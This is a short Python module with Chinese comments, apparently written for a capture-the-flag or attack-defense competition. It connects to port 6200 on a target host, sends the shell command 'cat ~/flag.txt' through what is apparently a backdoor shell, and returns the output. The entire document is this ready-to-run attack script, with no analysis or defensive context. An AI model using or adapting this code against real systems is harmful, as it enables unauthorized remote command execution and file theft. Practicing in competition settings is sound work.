# 引入PYTHON标准库"socket"。
import socket


def connecting6200_FLAG(RHOST = ""):
    '''提供连接到6200端口获取FLAG值的模块，
    :param RHOST: 提供对方IP地址 :class: str
    :return: 返回所需数据(flag) ：class: str
    '''

    # 创建一个 IPV4 TCP 链接的"socket"对象。
    connect6200 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 指定连接到的端口号为6200 
    RPORT = 6200
    # 指定连接成功后执行的SHELL指令，并以\n结尾。
    shell = "cat ~/flag.txt\n"
    
    # 建立于对方服务器的链接，RHOST为外部传入的IP地址，RPORT为指定的端口号。
    connect6200.connect((RHOST, RPORT))
    print("Try to connect to "+RHOST+":6200")

    # 向目标发送数据，格式为UTF-8。
    connect6200.send(shell.encode("utf-8"))

    # 接收目标返回的数据，格式为UTF-8。
    flag = connect6200.recv(8192).decode("utf-8")
    
    #关闭链接。
    connect6200.close()

    print(RHOST+" "+"flag"+"="+flag)

    return flag